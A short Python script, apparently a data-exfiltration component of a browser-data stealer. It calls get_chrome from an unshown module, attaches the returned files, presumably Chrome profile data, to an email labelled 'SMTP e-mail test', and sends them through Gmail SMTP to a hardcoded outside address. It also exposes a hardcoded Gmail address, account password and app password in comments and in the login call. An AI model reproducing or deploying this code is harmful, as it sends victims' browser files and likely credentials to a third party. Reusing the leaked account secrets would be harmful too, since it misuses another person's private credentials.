# 111111aA@ petterjoin2018@gmail.com
# mật khẩu ứng dụng:fakatvdofpozscyq 


import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from macpath import basename
sender = 'petterjoin2018@gmail.com'
receivers = ['danhcntt15@gmail.com'] #bcc

message = """From: From Person <@gmail.com>
To: To Person <danhcntt15@gmail.com>
Subject: SMTP e-mail test

This is a test e-mail message.
"""

from a import get_chrome

# try:
smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login("petterjoin2018@gmail.com", "fakatvdofpozscyq")

 
list_file_contain = get_chrome()
# files = []
# for file in list_file_contain:
#     files.append(open(file,"rb+"))
# print(files)


msg = MIMEMultipart()
msg.attach(MIMEText(message))


for f in list_file_contain or []:
    with open(f, "rb") as file:
        part = MIMEApplication(
            file.read(),
            Name=basename(f)
        )
    # After the file is closed
    part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
    msg.attach(part)


smtpObj.sendmail(sender, receivers, msg.as_string())         
print ("Successfully sent email")
# except Exception:
#     print ("Error: unable to send email")